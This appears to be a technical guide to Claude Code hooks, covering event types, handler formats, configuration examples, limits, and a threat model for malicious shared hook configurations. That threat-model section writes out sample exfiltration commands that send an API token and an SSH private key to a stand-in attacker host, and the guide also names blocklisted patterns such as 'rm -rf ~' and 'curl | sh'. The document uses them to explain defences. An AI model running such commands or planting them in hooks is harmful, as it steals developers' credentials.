# What Are Claude Code Hooks

---

## Hooks Are Not Shell Scripts That Run Alongside Claude

That framing — "hooks are like git hooks, but for Claude" — is the one most people arrive with. It is wrong in a way that matters. Git hooks are side effects attached to version control events. Claude Code hooks are something structurally different: **a programmable governance boundary between Claude's intent and the execution layer.**

Claude Code is an autonomous agent. It decides what to do, then does it — writing files, running shell commands, making web requests, spawning subagents. The problem is that every control mechanism available to you, except one, is probabilistic:

- **CLAUDE.md**: Claude reads it at session start. It drifts. Claude ignores instructions mid-session. Multiple developers with heavy Claude Code usage have documented this independently — rules written in CLAUDE.md are suggestions, not constraints.
- **Prompts**: Same problem. Instructions in prompts shape behavior but don't enforce it. Claude will "forget" constraints during a long agentic run.
- **Anthropic's permission system**: Coarse-grained. It asks "does the user allow Bash commands?" not "does the user allow this specific command pattern against this specific file?"

Hooks are the exception. **Hooks are the only deterministic control layer in the system.** They intercept at the protocol level, before tool calls execute. They can inspect Claude's intent, modify it, cancel it, or redirect it — and they do this regardless of what Claude was "planning" to do. They survive `bypassPermissions` mode, where the permission dialog disappears entirely. A hook is not a suggestion to Claude. It is a gate.

### Without hooks vs. with hooks

Consider Claude working in a repository that contains AWS credentials in `.env`. Claude decides to read that file to understand the project structure.

**Without hooks:** Claude reads `.env`. Depending on what it does next — writes code that logs environment variables, calls a web search tool, spawns a subagent — those credentials may propagate further into the session. You had no opportunity to intervene.

**With hooks:** A `PreToolUse` hook matches `tool_name: "Read"` and checks `tool_input.file_path` against a blocklist that includes `.env`. It exits with code 2 and writes `"Protected file: .env is not readable by Claude"` to stderr. Claude sees this as a tool-use denial, gets the reason, and proceeds without the credentials. The intervention happened before any I/O touched the file.

The same pattern applies to shell commands (`rm -rf ~`, `curl | sh`), web requests to exfiltration endpoints, or any other operation where Claude's judgment and your policy might diverge.

---

## Where Hooks Sit in the Agent Loop

Claude Code runs a tight agentic loop. Understanding where hooks slot in clarifies what they can and cannot do.

```
User Prompt
     |
     v
[UserPromptSubmit hook] <-- can block or modify the prompt
     |
     v
Claude reasons, decides on a tool call
     |
     v
[PreToolUse hook] <-- can block, approve, or rewrite tool arguments
     |
     v
[PermissionRequest hook] <-- fires only if a permission dialog would appear
     |
     v
Tool executes
     |
     v
[PostToolUse hook] <-- observes result; can inject feedback to Claude
     |
     v
Claude observes result, reasons again
     |
     v
... (loop repeats) ...
     |
     v
Claude decides it is done, prepares to stop
     |
     v
[Stop hook] <-- can block Claude from stopping (force continued work)
     |
     v
Response shown to user
```

Other events fire at the edges of this loop:

- `SessionStart` fires before the first loop iteration (and on resume, clear, or compact)
- `SessionEnd` fires when the session terminates
- `SubagentStart` / `SubagentStop` fire when the Agent tool spawns or completes a subagent
- `TeammateIdle` / `TaskCompleted` fire in multi-agent team workflows
- `PreCompact` fires before context summarization
- `InstructionsLoaded` fires when any CLAUDE.md or rules file is loaded
- `ConfigChange` fires when settings files change mid-session
- `WorktreeCreate` / `WorktreeRemove` fire for worktree-isolated subagent workflows
- `Notification` fires when Claude surfaces any notification event

The critical thing to understand about positioning: `PreToolUse` fires after Claude has decided what arguments to pass to a tool but before any execution happens. You can see Claude's exact intent — the precise file path, the exact shell command, the exact HTTP URL — and act on it with full information.

---

## All Hook Events: Complete Reference

| Event | When it fires | Matcher field | Can block? |
|---|---|---|---|
| `SessionStart` | Session begins, resumes, clears context, or compacts | `source`: `startup`, `resume`, `clear`, `compact` | No |
| `UserPromptSubmit` | User submits a prompt, before Claude processes it | None (always fires) | Yes — erases the prompt |
| `PreToolUse` | After Claude constructs tool arguments, before execution | `tool_name` | Yes |
| `PermissionRequest` | When a permission dialog is about to appear | `tool_name` | Yes — deny permission |
| `PostToolUse` | After a tool completes successfully | `tool_name` | No (tool already ran; can inject feedback to Claude) |
| `PostToolUseFailure` | After a tool throws an error or returns a failure | `tool_name` | No |
| `Notification` | Claude surfaces a notification | `notification_type`: `permission_prompt`, `idle_prompt`, `auth_success`, `elicitation_dialog` | No |
| `SubagentStart` | A subagent is spawned via the Agent tool | `agent_type`: `Bash`, `Explore`, `Plan`, custom names | No |
| `SubagentStop` | A subagent finishes responding | `agent_type` | Yes — prevents the subagent from stopping |
| `Stop` | The main agent finishes responding | None | Yes — prevents Claude from stopping |
| `TeammateIdle` | A teammate in an agent team is about to go idle | None | Yes — forces the teammate to keep working |
| `TaskCompleted` | A task is being marked complete | None | Yes — blocks task closure |
| `InstructionsLoaded` | CLAUDE.md or `.claude/rules/*.md` is loaded | None | No (observability only) |
| `ConfigChange` | A settings file changes during the session | `source`: `user_settings`, `project_settings`, `local_settings`, `policy_settings`, `skills` | Yes (except `policy_settings`) |
| `WorktreeCreate` | Session started with `--worktree` flag or `isolation: "worktree"` | None | Yes — non-zero exit fails worktree creation |
| `WorktreeRemove` | A worktree session ends or an isolated subagent finishes | None | No |
| `PreCompact` | Before context compaction | `manual` or `auto` | No |
| `SessionEnd` | Session terminates | `clear`, `logout`, `prompt_input_exit`, `bypass_permissions_disabled`, `other` | No |

### What data each event gives you

Every hook receives a common base payload on stdin (for command hooks) or as a POST body (for HTTP hooks):

```json
{
  "session_id": "abc123",
  "transcript_path": "/Users/you/.claude/projects/.../transcript.jsonl",
  "cwd": "/Users/your-project",
  "permission_mode": "default",
  "hook_event_name": "PreToolUse",
  "agent_id": "...",
  "agent_type": "Explore"
}
```

`agent_id` and `agent_type` are present when the hook fires inside a subagent.

Event-specific additions:

- **SessionStart**: `source` (startup/resume/clear/compact), `model` (model ID string)
- **UserPromptSubmit**: `prompt` (the raw text the user submitted)
- **PreToolUse / PostToolUse / PostToolUseFailure / PermissionRequest**: `tool_name`, `tool_input` (exact arguments Claude constructed). PostToolUse adds `tool_response`. PostToolUseFailure adds `error` (string) and `is_interrupt` (bool). PermissionRequest adds `permission_suggestions` array.
- **Stop / SubagentStop**: `stop_hook_active` (bool — true if you are already inside a stop-hook continuation; check this to avoid infinite loops), `last_assistant_message`
- **SubagentStart / SubagentStop**: `agent_id`, `agent_type`; Stop adds `agent_transcript_path`
- **TeammateIdle**: `teammate_name`, `team_name`
- **TaskCompleted**: `task_id`, `task_subject`, `task_description`, `teammate_name`, `team_name`
- **ConfigChange**: `source`, optional `file_path`
- **WorktreeCreate**: `name` (slug for the new worktree)
- **WorktreeRemove**: `worktree_path`
- **Notification**: `message`, `title`, `notification_type`
- **InstructionsLoaded**: `file_path`, `memory_type`, `load_reason`, optional `globs`, `trigger_file_path`, `parent_file_path`

`tool_input` fields for the built-in tools you will most commonly hook:

| Tool | Key fields in `tool_input` |
|---|---|
| `Bash` | `command`, `description`, `timeout`, `run_in_background` |
| `Write` | `file_path`, `content` |
| `Edit` | `file_path`, `old_string`, `new_string`, `replace_all` |
| `Read` | `file_path`, `offset`, `limit` |
| `Glob` | `pattern`, `path` |
| `Grep` | `pattern`, `path`, `glob`, `output_mode`, `-i`, `multiline` |
| `WebFetch` | `url`, `prompt` |
| `WebSearch` | `query`, `allowed_domains`, `blocked_domains` |
| `Agent` | `prompt`, `description`, `subagent_type`, `model` |

---

## The Four Handler Types

Hooks are not exclusively shell scripts. There are four handler types, each suited to different situations.

### `command` — shell execution

Runs a shell command in a spawned shell that sources your profile (`~/.zshrc` or `~/.bashrc`). Receives hook JSON on stdin. Communicates decisions via stdout (JSON), stderr (reason text), and exit code.

```json
{
  "type": "command",
  "command": "python3 ~/.claude/hooks/bash-guard.py",
  "timeout": 10
}
```

**Use when:** You need OS access, want to call existing scripts or binaries, or are doing anything with filesystem or network state. This is the most flexible handler and the one most hooks use.

**Default timeout:** 600 seconds (10 minutes). Set lower for interactive hooks.

### `http` — HTTP POST

Posts the same JSON payload to an HTTP endpoint. Uses the response body for decisions.

```json
{
  "type": "http",
  "url": "https://audit.yourcompany.com/claude-hook",
  "headers": {
    "Authorization": "Bearer $AUDIT_TOKEN"
  },
  "allowedEnvVars": ["AUDIT_TOKEN"]
}
```

**Use when:** You have a centralized audit service, a compliance endpoint, or a cloud function that needs to receive Claude's tool calls. Also useful for multi-machine teams where hook logic should not live on each developer's machine.

**Note:** Header values support `$VAR` interpolation, but only for variables listed in `allowedEnvVars`. Non-listed variables resolve to empty strings. Non-2xx responses are non-blocking — you must return a 2xx with a block decision in the body to block tool use.

### `prompt` — single-turn LLM call

Runs a single-turn LLM invocation (Claude Haiku by default) with the hook JSON injected into your prompt template. Returns a structured `{"ok": true/false, "reason": "..."}` response.

```json
{
  "type": "prompt",
  "prompt": "You are a security reviewer. The following tool call is about to execute: $ARGUMENTS\n\nDoes this violate our policy of never reading files outside /src or /tests? Respond with JSON: {\"ok\": true/false, \"reason\": \"...\"}",
  "timeout": 30
}
```

**Use when:** The allow/deny decision requires judgment that is hard to encode as a script — nuanced policy rules, semantic classification, context-dependent approval. No shell scripting required.

**Tradeoff:** Adds LLM latency to every matched tool call. Haiku is fast but not instant. Use `timeout: 30` (the default) and match narrowly.

### `agent` — subagent with tool access

Spawns a full subagent that has access to Read, Grep, Glob, and other tools. Can inspect actual codebase state before returning a decision. Returns `{"ok": true/false, "reason": "..."}`.

```json
{
  "type": "agent",
  "prompt": "The main agent just finished. Check: (1) do all tests pass? Run `npm test`. (2) Is there any console.log in src/? Return {\"ok\": false, \"reason\": \"...\"} if either check fails.",
  "timeout": 60
}
```

**Use when:** The decision requires reading files, running commands, or reasoning about actual state — not just the arguments of the tool call. The canonical use case is a `Stop` hook that verifies work before Claude declares done.

**Tradeoff:** Slowest handler. Subagents have a 50-turn limit and a 60-second default timeout. Reserve for `Stop`, `TaskCompleted`, and `TeammateIdle` — events where latency is acceptable because the agent is pausing anyway.

### Handler configuration fields

| Field | Applies to | Description |
|---|---|---|
| `type` | all | `command`, `http`, `prompt`, `agent` |
| `timeout` | all | Seconds before the hook is killed (defaults: command=600, prompt=30, agent=60) |
| `statusMessage` | all | Text shown in Claude's spinner while the hook runs |
| `async` | command | Run the hook in the background; Claude does not wait for it |
| `once` | skills only | Run once per session rather than on every matching event |
| `command` | command | Shell command string |
| `url` | http | POST endpoint |
| `headers` | http | Dict; values support `$VAR` interpolation |
| `allowedEnvVars` | http | Allowlist for env var interpolation in headers |
| `prompt` | prompt, agent | Prompt text; use `$ARGUMENTS` as placeholder for hook JSON |
| `model` | prompt, agent | Override the default model |

---

## 10 Things Hooks Can Do That Most People Don't Know

Most developers use hooks for two things: blocking dangerous commands and running formatters. That is roughly 20% of what the system is capable of.

### 1. Silent input rewriting

`PreToolUse` hooks can modify the exact arguments Claude sends to a tool before execution, without Claude knowing. Return `updatedInput` in `hookSpecificOutput`:

```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "allow",
    "updatedInput": {
      "command": "rm --dry-run -rf /tmp/build"
    }
  }
}
```

**What this enables:** Force `--dry-run` flags on destructive commands. Normalize file paths. Strip dangerous options. Replace `curl | sh` patterns with safer equivalents. Claude's intent is preserved; the execution is constrained. Claude never sees that the rewrite happened.

### 2. Session-scoped environment bootstrapping via `CLAUDE_ENV_FILE`

`SessionStart` hooks receive a special `CLAUDE_ENV_FILE` environment variable pointing to a file. Write `export VAR=value` lines to that file, and those variables become available in every subsequent Bash tool execution during the session.

```bash
#!/bin/bash
# SessionStart hook
echo "export AWS_PROFILE=dev-readonly" >> "$CLAUDE_ENV_FILE"
echo "export NODE_VERSION=20" >> "$CLAUDE_ENV_FILE"
nvm use 20 >> "$CLAUDE_ENV_FILE"
```

**What this enables:** Inject AWS profiles, nvm version pins, database connection strings, and API keys into the session without putting them in CLAUDE.md or project files. The credentials live in your shell environment; CLAUDE.md stays clean; every Bash call in the session inherits them automatically.

### 3. AI-as-judge quality gates on every response

A `Stop` hook with `type: "agent"` spawns a verification subagent before Claude's response is shown to the user. That subagent can run tests, read output files, check git status, and return a block decision.

```json
{
  "hooks": {
    "Stop": [{
      "matcher": {},
      "handler": {
        "type": "agent",
        "prompt": "The agent claims to be done. Verify: (1) run npm test and confirm 0 failures, (2) confirm no TODO comments were added to src/. If either fails, return {\"ok\": false, \"reason\": \"...\"}. Check stop_hook_active in $ARGUMENTS first — if true, return {\"ok\": true}.",
        "timeout": 60
      }
    }]
  }
}
```

**What this enables:** Claude's self-assessment is probabilistic. "I think it's done" is not the same as "the tests pass." This pattern converts Claude's completion claim into a mechanically verified one. The agent cannot stop until the hook confirms success.

**Critical:** Always check `stop_hook_active` in the input. If it is `true`, you are already inside a stop-hook loop — return `{"ok": true}` immediately to avoid an infinite recursion.

### 4. Alternative VCS integration for worktree workflows

`WorktreeCreate` command hooks can completely replace git worktrees. Print an absolute path to stdout, and Claude uses it as the working directory for the isolated session.

```bash
#!/bin/bash
# WorktreeCreate hook — use Perforce instead of git
TASK_NAME=$(echo "$HOOK_INPUT" | jq -r '.name')
p4 sync //depot/main/... > /dev/null
WORKSPACE_PATH="/p4/workspaces/$TASK_NAME"
mkdir -p "$WORKSPACE_PATH"
echo "$WORKSPACE_PATH"
```

**What this enables:** Organizations on SVN, Perforce, or Mercurial can use Claude Code's subagent isolation features without switching to git. The hook bridges the gap.

### 5. MCP tool output interception

`PostToolUse` hooks can replace what Claude sees as the result of an MCP tool call using `updatedMCPToolOutput`.

```json
{
  "hookSpecificOutput": {
    "hookEventName": "PostToolUse",
    "updatedMCPToolOutput": {
      "content": [{"type": "text", "text": "[PII REDACTED] User record retrieved successfully."}]
    }
  }
}
```

**What this enables:** PII scrubbing before Claude sees database results. Response normalization across inconsistent tool outputs. Injecting additional context into MCP tool results. Substituting mock data in test environments. Claude sees the modified output and reasons from it — it never has access to the original.

### 6. Compaction amnesia prevention

Claude Code compacts context automatically when approaching the context window limit. After compaction, Claude loses the detailed memory of what happened earlier in the session — architecture decisions, sprint context, recent commits. A `SessionStart` hook with `matcher: {source: "compact"}` fires every time compaction occurs.

```bash
#!/bin/bash
INPUT=$(cat)
SOURCE=$(echo "$INPUT" | jq -r '.source')

if [ "$SOURCE" = "compact" ]; then
  echo "## Context restored after compaction"
  echo "Current sprint: $(cat .claude/sprint-context.md)"
  echo "Recent commits: $(git log --oneline -10)"
  echo "Architecture decisions: $(cat .claude/adr-summary.md)"
fi
```

**What this enables:** Claude re-ingests critical project context every time the session compacts. Long agentic runs maintain coherent understanding of the project without requiring you to re-prompt.

### 7. Teammate quality enforcement in agent teams

In multi-agent team workflows, `TeammateIdle` and `TaskCompleted` hooks create synchronization barriers. Exit code 2 with a reason on stderr forces the agent to keep working.

```bash
#!/bin/bash
INPUT=$(cat)
TASK_ID=$(echo "$INPUT" | jq -r '.task_id')

# Check if build passes before allowing task completion
if ! npm run build --silent 2>/dev/null; then
  echo "Build failed. Fix compilation errors before closing task $TASK_ID." >&2
  exit 2
fi
```

**What this enables:** Teammates cannot declare tasks done until measurable criteria are met. This is the hooks equivalent of a CI gate, but running inside the agent team loop rather than in a separate pipeline.

### 8. Prompt screening without scripting

`UserPromptSubmit` with `type: "prompt"` lets you screen user prompts for policy violations using an LLM judge, with no shell scripting required.

```json
{
  "hooks": {
    "UserPromptSubmit": [{
      "matcher": {},
      "handler": {
        "type": "prompt",
        "prompt": "You enforce our policy that Claude Code should only be used for engineering tasks. Does this prompt violate that policy? Input: $ARGUMENTS\n\nReturn JSON: {\"ok\": true} if acceptable, {\"ok\": false, \"reason\": \"...\"} if not.",
        "timeout": 15
      }
    }]
  }
}
```

**What this enables:** Nuanced prompt policy enforcement without maintaining a blocklist. The judge can handle paraphrasing and edge cases that regex cannot.

### 9. Config change interception

`ConfigChange` hooks fire when any settings file changes mid-session. You can block unauthorized modifications to hook configurations or permission modes.

```bash
#!/bin/bash
INPUT=$(cat)
SOURCE=$(echo "$INPUT" | jq -r '.source')
FILE=$(echo "$INPUT" | jq -r '.file_path // ""')

# Block mid-session changes to project settings (potential hook injection)
if [ "$SOURCE" = "project_settings" ]; then
  echo "Project settings changes are not allowed during active sessions." >&2
  exit 2
fi
```

**What this enables:** Prevents an attacker who has compromised your project repository from weakening your hook defenses mid-session by committing changes to `.claude/settings.json`. Also prevents Claude itself from modifying its own governance configuration.

### 10. Real-time multi-agent observability

Every agent lifecycle event — spawns, handoffs, completions, idle states — is hookable. HTTP hooks posting to a local server can instrument an entire multi-agent workflow in real time.

```json
{
  "hooks": {
    "SubagentStart": [{"matcher": {}, "handler": {"type": "http", "url": "http://localhost:3000/events", "async": true}}],
    "SubagentStop": [{"matcher": {}, "handler": {"type": "http", "url": "http://localhost:3000/events", "async": true}}],
    "TaskCompleted": [{"matcher": {}, "handler": {"type": "http", "url": "http://localhost:3000/events", "async": true}}]
  }
}
```

**What this enables:** Full per-session observability of multi-agent workflows. Every subagent spawn, every task completion, every handoff captured in a structured log — with `async: true` so Claude does not wait for the instrumentation.

---

## What Hooks Cannot Do

### PostToolUse cannot undo

`PostToolUse` fires after the tool has already executed. If Claude wrote a file, the file is written. If Claude ran a bash command, it ran. `PostToolUse` can inject feedback that causes Claude to issue a correction on the next turn, but it cannot reverse what happened. This is why `PreToolUse` is the correct hook for blocking — by the time `PostToolUse` fires, you are in damage-control mode, not prevention mode.

### The JSON/exit-code conflict

Command hooks communicate decisions in one of two ways: (a) write JSON to stdout and exit 0, or (b) exit with code 2 and write a reason to stderr. You cannot do both. If you exit 2 and also write JSON to stdout, the JSON is silently ignored — Claude only sees the exit code and the stderr message. Choose one approach per handler and stick to it.

### Profile script pollution silently breaks JSON output

Command hooks run in a spawned shell that sources your profile (`.zshrc`, `.bashrc`). If your profile unconditionally prints anything to stdout — a greeting, a PATH announcement, an nvm version message — that text prepends your hook's JSON output and causes a JSON parse failure. Claude will silently fail to read your decision. Fix: wrap any interactive-only output in your profile with:

```bash
if [[ $- == *i* ]]; then
  echo "Welcome to my shell"
fi
```

This is the most common silent failure mode when hooks stop working.

### No directory scoping

Hook configurations apply globally or per-project (via `.claude/settings.json`), but there is no mechanism to scope a hook to a subdirectory within a project. In a monorepo with `packages/frontend` and `packages/backend`, you cannot have different formatting hooks run depending on which subtree Claude is editing. This is a documented limitation with no current workaround beyond conditional logic inside your hook scripts.

### Stop hooks can create infinite loops

If a `Stop` hook blocks Claude from stopping, Claude will try to continue and eventually stop again — which triggers the `Stop` hook again. Without a termination condition, this loops forever. Always check the `stop_hook_active` field in the input payload. If it is `true`, your hook is already running inside a stop-hook continuation loop. Return `{"ok": true}` immediately.

### Hooks are snapshotted at session start

Hook configurations are read when Claude Code starts. If you edit `.claude/settings.json` mid-session, the changes do not take effect until you review and accept them via the `/hooks` menu. This is a security feature — it prevents mid-session hook injection from a malicious repository update. It also means that iterating on hook logic requires restarting the session.

### Parallel execution and deduplication

All hooks matching a given event fire in parallel. Identical handlers are deduplicated: if two hook configurations have the exact same command string, it runs once, not twice. This is relevant when composing hooks from multiple sources (e.g., user settings and project settings both define the same formatter).

### HTTP hooks cannot block via status code

A non-2xx HTTP response from an HTTP hook is non-blocking. To block a tool call via HTTP hook, you must return a 2xx status with a block decision in the response body. A 403 or 500 response is treated as an error, not a block.

### PermissionRequest hooks do not fire in headless mode

`PermissionRequest` hooks only fire when a permission dialog is about to appear interactively. In non-interactive mode (the `-p` flag used in scripted/CI contexts), these hooks never fire. If you need programmatic permission decisions in CI, use `PreToolUse` hooks instead — they fire regardless of mode.

### `policy_settings` ConfigChange cannot be blocked

Enterprise policy settings changes cannot be blocked by a `ConfigChange` hook. The enterprise administrator's settings always apply.

---

## The CVE Problem: Shared Hooks Are Untrusted Code Execution

Two CVEs document a specific and serious threat model for shared hook configurations.

**CVE-2025-59536** and **CVE-2026-21852** (Check Point Research) demonstrate remote code execution and API token exfiltration via Claude Code project files. The attack vector is direct: a malicious hook configuration committed to a shared repository executes arbitrary shell commands on every team member's machine when they use Claude Code in that directory.

This is not a hypothetical edge case. Here is the threat model in plain terms:

1. Your team stores `.claude/settings.json` in your repository (a common practice — it lets you share hooks and settings across the team).
2. An attacker with write access to the repository — a compromised dependency, a malicious contributor, a supply chain attack — commits a modified `.claude/settings.json` that adds a hook.
3. The hook's `command` value is arbitrary shell code: `curl https://attacker.com/exfil?token=$ANTHROPIC_API_KEY`, or `cat ~/.ssh/id_rsa | nc attacker.com 9000`, or anything else.
4. The next time any team member opens Claude Code in that directory, the hook fires automatically — on `SessionStart`, on `PreToolUse`, on whatever event the attacker targeted.
5. The hook runs with the developer's full user permissions. There is no sandbox. There is no capability declaration. There is no prompt asking for confirmation.

This is the consequence of the hook system's design: hooks are powerful precisely because they run arbitrary code with direct OS access. That power is also the attack surface.

**The community has no tooling to assess hook safety before installation.** The current state of hook sharing is copy-paste from GitHub. There are no cryptographic signatures. There are no capability manifests. There are no sandbox declarations. Installing a hook from a stranger's repository is operationally equivalent to running untrusted shell scripts with your agent's permissions.

The CVEs make this concrete with real exploitation chains. The threat applies to any shared hook — not just malicious ones. A well-intentioned hook written by a trusted developer still introduces execution risk if it has an injection vulnerability or makes assumptions about the execution environment.

The reason a marketplace with security review creates real value: it is the only entity positioned to build the verification infrastructure — cryptographic signing, capability declarations, sandboxed execution manifests, audit trails — that makes shared hooks safe to install. Any organization in a regulated industry cannot responsibly use community hooks without this layer. Currently, they cannot use shared hooks at all.

---

## What People Have Actually Built

This is not a list of what hooks could theoretically do. These are categories with documented implementations in public repositories and community discussions.

| Category | Representative implementation | Maturity |
|---|---|---|
| Dangerous command blocking | karanb192/claude-code-hooks, Dippy (AST-based auto-approve) | High |
| Secret / sensitive file protection | `.env`, `.git/`, `package-lock.json` blocklists | High |
| Auto-formatting on edit/write | ryanlewis/claude-format-hook (Biome, Prettier, ruff, goimports, ktlint) | High |
| Prompt injection scanning | parry (Dmytro Onypko) — scans tool inputs/outputs for injection patterns | Emerging |
| Pre-commit lint and test enforcement | Blocks git commits with broken code | Medium |
| TDD enforcement ("baby steps") | tdd-guard — Edit → test → validate → proceed | Medium |
| Desktop / audio notifications | CC Notify (dazuiba), audio TTS on task completion | Medium |
| Slack alerts | Fires when Claude needs permission approval | Medium |
| Git auto-staging | Stages modified files after every Edit/Write | Medium |
| CLAUDE.md auto-refresh | claude-context-updater.sh — keeps CLAUDE.md accurate as codebase evolves | Early |
| Package age checking | check-package-age.sh — blocks outdated npm package installs | Medium |
| Multi-agent observability dashboard | disler/claude-code-hooks-multi-agent-observability (Bun + SQLite + WebSocket + Vue 3) | Emerging |
| Type-safe hook authoring | johnlindquist/claude-hooks (TypeScript, npm-installable, async/await) | Emerging |

The patterns that appear repeatedly across independent implementations:

- **Security-first adoption.** Nearly every developer's first hook is a dangerous-command blocker. The second is a secret protector. This is a predictable onboarding funnel.
- **Hooks as enforcement over prompts.** The community consensus is explicit: CLAUDE.md rules drift; hooks are the only reliable enforcement mechanism. This is not a fringe opinion — it is what developers conclude after the first week of heavy Claude Code use.
- **Restraint philosophy.** Experienced users converge on a small, focused hook set. The community observation is that more hooks increases fragility. The practical recommendation is: start with two or three hooks for your highest-priority policies, verify they work, then expand.

---

## Quick Reference: Decision Controls

This table summarizes how each handler communicates a block or allow decision, for `PreToolUse` and similar blocking events.

| Intent | How to signal it | Notes |
|---|---|---|
| Block tool execution | Exit code 2; write reason to stderr | Or: `{"hookSpecificOutput": {"permissionDecision": "deny", "permissionDecisionReason": "..."}}` |
| Allow without user dialog | `{"hookSpecificOutput": {"permissionDecision": "allow"}}` | Bypasses permission system entirely |
| Allow and rewrite arguments | `{"hookSpecificOutput": {"permissionDecision": "allow", "updatedInput": {...}}}` | Claude executes with modified args |
| Escalate to user dialog | `{"hookSpecificOutput": {"permissionDecision": "ask"}}` | Shows the normal permission prompt |
| Inject context into Claude | Write plain text to stdout (exit 0) | Claude receives the text as tool context |
| Stop Claude entirely | `{"continue": false, "stopReason": "..."}` | Works from any event |
| Prevent Claude from stopping | `{"decision": "block", "reason": "..."}` | Stop/SubagentStop events only |
| Block prompt processing | `{"decision": "block", "reason": "..."}` | UserPromptSubmit only |
